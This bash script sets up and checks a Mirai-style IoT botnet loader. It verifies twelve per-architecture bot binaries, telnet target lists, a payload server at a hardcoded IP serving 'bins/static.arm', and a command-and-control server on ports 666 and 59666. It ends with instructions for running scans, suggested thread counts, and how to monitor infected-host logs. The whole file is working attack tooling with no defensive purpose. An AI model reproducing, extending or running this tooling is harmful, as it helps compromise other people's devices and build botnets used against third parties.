#!/bin/bash

echo "=== Loader.py Setup Script ==="
echo

# Check if we're in the right directory
if [ ! -f "loader.py" ]; then
    echo "❌ Error: loader.py not found. Run this script from /root/loader/"
    exit 1
fi

echo "✅ Found loader.py"

# Check binaries
echo "📁 Checking binary files..."
BINARY_COUNT=$(ls -la bins/static.* 2>/dev/null | wc -l)
if [ $BINARY_COUNT -eq 12 ]; then
    echo "✅ All 12 architecture binaries found"
else
    echo "❌ Warning: Expected 12 binaries, found $BINARY_COUNT"
    echo "Available binaries:"
    ls -la bins/static.* 2>/dev/null || echo "No binaries found in bins/ directory"
fi

# Check target lists
echo "📋 Checking target lists..."
if [ -f "telnet.txt" ]; then
    TELNET_COUNT=$(wc -l < telnet.txt)
    echo "✅ telnet.txt found with $TELNET_COUNT targets"
else
    echo "❌ telnet.txt not found"
fi

if [ -f "list.txt" ]; then
    LIST_COUNT=$(wc -l < list.txt)
    echo "✅ list.txt found with $LIST_COUNT targets"
else
    echo "❌ list.txt not found"
fi

# Check Python
echo "🐍 Checking Python..."
if command -v python &> /dev/null; then
    PYTHON_VERSION=$(python --version 2>&1)
    echo "✅ Python found: $PYTHON_VERSION"
else
    echo "❌ Python not found"
fi

# Check HTTP server
echo "🌐 Checking HTTP server..."
if curl -s -I http://185.247.117.214/bins/static.arm | head -1 | grep -q "200 OK"; then
    echo "✅ HTTP server responding correctly"
else
    echo "❌ HTTP server not responding or binaries not accessible"
fi

# Check CNC server
echo "🖥️ Checking CNC server..."
if netstat -tlnp 2>/dev/null | grep -q ":666\|:59666"; then
    echo "✅ CNC server is running"
else
    echo "❌ CNC server not running on ports 666/59666"
fi

echo
echo "=== Setup Complete ==="
echo
echo "🚀 To run the loader:"
echo "   python loader.py telnet.txt"
echo
echo "📊 Recommended thread counts:"
echo "   - Small test: 10-50 threads"
echo "   - Medium scan: 50-200 threads"  
echo "   - Large scan: 200-500 threads"
echo
echo "📈 Monitor progress:"
echo "   tail -f bots.txt infected.txt echoes.txt"
echo
echo "🛑 To stop: Press Enter 3 times in the loader"

